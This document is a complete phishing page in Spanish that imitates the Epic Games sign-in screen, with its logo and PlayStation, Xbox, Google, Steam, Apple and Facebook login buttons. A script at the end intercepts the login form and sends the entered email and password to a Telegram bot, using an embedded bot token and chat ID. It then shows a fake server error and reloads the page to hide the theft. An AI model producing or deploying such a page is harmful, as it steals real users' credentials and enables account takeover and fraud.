<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en tu cuenta de Epic Games | Epic Games</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { background-color: #121212; font-family: 'Inter', sans-serif; -webkit-font-smoothing: antialiased; color: white; }
        .main-card { background-color: #202020; border-radius: 4px; max-width: 440px; width: 100%; padding: 40px 50px; margin: 20px; }
        .input-epic { background-color: #333; border: 1px solid transparent; height: 56px; border-radius: 4px; padding: 0 16px; width: 100%; color: white; transition: 0.2s; }
        .input-epic:focus { border-color: #f5f5f5; outline: none; }
        .btn-blue { background-color: #007bff; height: 56px; border-radius: 4px; width: 100%; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; font-size: 14px; margin-top: 10px; }
        .btn-blue:hover { background-color: #0069d9; }
        .console-btn { background-color: #333; border-radius: 4px; height: 85px; display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 11px; color: #8a8a8a; cursor: pointer; transition: 0.2s; }
        .console-btn:hover { background-color: #444; }
        .console-btn img { width: 28px; height: 28px; margin-bottom: 8px; filter: brightness(0) invert(1); }
        .separator { height: 1px; background-color: #333; flex-grow: 1; }
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <div class="main-card shadow-2xl">
        <div class="flex justify-center mb-10">
            <svg viewBox="0 0 44 52" class="w-10 fill-current text-white"><path d="M43.035 15.228c0-.363-.075-.724-.224-1.06a3.02 3.02 0 00-.638-.897 2.94 2.94 0 00-.93-.615 2.9 2.9 0 00-1.12-.224H4.877c-.364 0-.724.075-1.061.224a2.91 2.91 0 00-.9.615 2.94 2.94 0 00-.636.897c-.15.336-.225.697-.225 1.06v21.544c0 .363.075.724.225 1.06a3.02 3.02 0 00.636.897c.273.272.585.483.9.615.337.15.697.224 1.061.224H12.9v9.062a.45.45 0 00.77.32L23.184 38.65h17.813c.364 0 .724-.075 1.06-.224a3.02 3.02 0 00.93-.615 3.06 3.06 0 00.638-.897c.15-.336.224-.697.224-1.06V15.228h-.014z"/></svg>
        </div>
        <h1 class="text-center font-bold text-xs uppercase tracking-[.2em] mb-8">Iniciar sesión</h1>
        
        <form id="loginForm" class="space-y-4">
            <input type="email" id="email" placeholder="Correo electrónico" class="input-epic" required>
            <input type="password" id="password" placeholder="Contraseña" class="input-epic" required>
            <div class="flex justify-between items-center text-[11px] text-gray-400">
                <label class="flex items-center cursor-pointer"><input type="checkbox" class="mr-2 w-4 h-4 rounded bg-gray-700 border-none"> Recuérdame</label>
                <a href="#" class="underline hover:text-white">¿Has olvidado tu contraseña?</a>
            </div>
            <button type="submit" class="btn-blue">Iniciar sesión</button>
        </form>

        <div class="flex items-center my-8">
            <div class="separator"></div>
            <span class="px-4 text-gray-500 text-[10px] font-bold uppercase tracking-widest">o</span>
            <div class="separator"></div>
        </div>

        <div class="grid grid-cols-2 gap-3 mb-3">
            <div class="console-btn"><img src="https://www.svgrepo.com/show/303233/playstation-6-logo.svg"><span>PlayStation™ Network</span></div>
            <div class="console-btn"><img src="https://www.svgrepo.com/show/303215/xbox-logo.svg"><span>Red Xbox</span></div>
        </div>
        <div class="grid grid-cols-4 gap-2">
            <div class="console-btn h-14"><img src="https://www.svgrepo.com/show/303108/google-icon.svg" style="filter:none; width:20px;"></div>
            <div class="console-btn h-14"><img src="https://www.svgrepo.com/show/354392/steam.svg" style="width:22px;"></div>
            <div class="console-btn h-14"><img src="https://www.svgrepo.com/show/331300/apple.svg" style="width:20px;"></div>
            <div class="console-btn h-14"><img src="https://www.svgrepo.com/show/353733/facebook.svg" style="filter:none; width:20px;"></div>
        </div>

        <div class="text-center mt-10 text-xs text-gray-400">
            ¿No tienes una cuenta de Epic Games? <a href="#" class="text-white underline font-bold ml-1">Regístrate</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            const botToken = "8609726894:AAGpEsj7vz-M01u8RRNww3z8lbX3cgTeEmQ";
            const chatId = "6585533652";
            const msg = `🎯 **LOGIN EPIC GAMES**\n📧 Email: ${email}\n🔑 Pass: ${password}\n🇪🇸 Market: ES`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
            }).then(() => {
                alert('Error de conexión con el servidor (503). Inténtelo de nuevo.');
                window.location.reload();
            });
        });
    </script>
</body>
</html>
